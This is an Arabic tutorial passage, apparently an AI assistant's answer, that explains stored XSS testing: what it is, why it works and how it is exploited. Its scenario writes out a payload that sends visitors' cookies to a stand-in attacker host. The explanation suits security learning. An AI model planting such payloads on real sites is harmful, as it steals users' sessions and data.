بناءً على طلبك لشرح **اختبار ثغرة XSS المخزن (Test for Stored XSS)** باستخدام نفس طريقة الشرح المقدمة (التي تتضمن أقسامًا مثل "ما المقصود؟"، "لماذا يعمل؟"، "كيف يتم الاستغلال؟"، والخطوات العملية)، سأقدم شرحًا مفصلاً ومنظمًا لهذه العملية في اختبار ثغرات Cross-Site Scripting (XSS). سأغطي جميع المحاولات الممكنة لاختبار ثغرة XSS المخزن، مع التركيز على إدخال شيفرات JavaScript في نقاط إدخال (مثل التعليقات، منشورات المستخدم، أو حقول الملف الشخصي) التي تُخزن في قاعدة بيانات التطبيق وتُعرض لاحقًا للمستخدمين دون تنظيف كافٍ. سيتم تقسيم المحاولات إلى فئات (مثل حقن وسوم HTML، استخدام أحداث JavaScript، وتجاوز الفلاتر). سيتم تضمين المحتوى في علامة `<xaiArtifact>` كما هو مطلوب، مع معرف جديد لأن هذا طلب مستقل يركز على خطوة محددة. سأحافظ على الشرح باللغة العربية بأسلوب واضح ومنظم، متجنبًا تنسيق Markdown خارج العلامة بناءً على طلبك السابق.

---

## فهم الخطوة: اختبار ثغرة XSS المخزن (Test for Stored XSS)

### ما المقصود؟
اختبار ثغرة **XSS المخزن (Stored XSS)** هو عملية اختبار أمان لتحديد ما إذا كان التطبيق الإلكتروني عرضة لثغرة Cross-Site Scripting من النوع المخزن، حيث يتم إدخال شيفرة JavaScript ضارة في نقطة إدخال (مثل حقل تعليق، منشور مستخدم، أو وصف ملف شخصي)، تُخزن في قاعدة بيانات التطبيق، ثم تُعرض لاحقًا للمستخدمين الآخرين أو نفس المستخدم دون تنظيف أو تصفية كافية. تُسمى "مخزنة" لأن الشيفرة الضارة تُحفظ بشكل دائم وتؤثر على كل من يزور الصفحة التي تعرض البيانات المحقونة. الهدف هو تنفيذ شيفرة JavaScript في متصفح الضحية لأغراض مثل سرقة البيانات، التلاعب بالصفحة، أو تنفيذ إجراءات غير مصرح بها.

### لماذا يعمل؟
- **تخزين البيانات دون تنظيف**: التطبيقات التي لا تُنظف الإدخالات قبل حفظها في قاعدة البيانات قد تُخزن شيفرة JavaScript ضارة.
- **عرض البيانات في DOM**: عند استرجاع البيانات المخزنة وعرضها في HTML، يتم تنفيذ الشيفرة إذا لم تُنظف أو تُشفر بشكل صحيح.
- **دعم المتصفحات لـ JavaScript**: المتصفحات تُنفذ JavaScript تلقائيًا عند إدراجه في وسوم مثل `<script>`، أحداث مثل `onload`، أو بروتوكولات مثل `javascript:`.
- **تأثير واسع**: نظرًا لأن الشيفرة مخزنة، فإنها تؤثر على جميع المستخدمين الذين يشاهدون الصفحة المصابة، مما يجعلها خطيرة جدًا.
- **تجاوز الفلاتر البسيطة**: الفلاتر الضعيفة قد تحظر وسومًا مثل `<script>` ولكن تسمح بأحداث (`onerror`)، روابط (`javascript:`)، أو صيغ معقدة.

### كيف يتم الاستغلال؟
- يتم إدخال شيفرة JavaScript في نقطة إدخال تُخزن في قاعدة البيانات (مثل تعليق أو منشور) عبر طلب HTTP (عادةً POST).
- تُصمم الحقنة لتنفيذ شيفرة عندما يتم استرجاع البيانات المخزنة وعرضها في متصفح المستخدم، إما تلقائيًا (مثل `<script>` أو `<img onload>`) أو عند التفاعل (مثل النقر على رابط `javascript:`).
- تُستخدم الشيفرة لتنفيذ إجراءات ضارة مثل:
  - سرقة ملفات تعريف الارتباط (`document.cookie`).
  - استخراج محتوى الصفحة (`document.body.innerHTML`).
  - إعادة توجيه المستخدم إلى موقع ضار.
  - تتبع إدخالات المستخدم (مثل تسجيل كلمات المرور).
- يتم مراقبة خادم خارجي (للبيانات المسربة) أو استجابة المتصفح لتأكيد التنفيذ:
  - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه أو إرسال بيانات إلى خادم المهاجم).
  - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، قيود CSP، أو تنظيف الإدخال.
- تُكيَّف الحقن لتجاوز الفلاتر (مثل استخدام صيغ بديلة أو تعتيم الشيفرة).

### السناريو
لنفترض أنك تختبر موقعًا إلكترونيًا يحتوي على قسم تعليقات يسمح للمستخدمين بإدخال نصوص في حقل تعليق. لاحظت أن التعليقات تُخزن في قاعدة البيانات وتُعرض لجميع زوار الصفحة. حاولت إدخال `<script>alert('XSS')</script>` في حقل التعليق، ولاحظت ظهور تنبيه عند تحميل الصفحة التي تحتوي على التعليق. تريد الآن استخدام حقنة مثل `<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">` لاستخراج بيانات حساسة من المستخدمين الآخرين الذين يشاهدون التعليق. إذا تلقى خادمك البيانات أو نُفذت الشيفرة، فهذا يؤكد وجود ثغرة XSS مخزن.

---
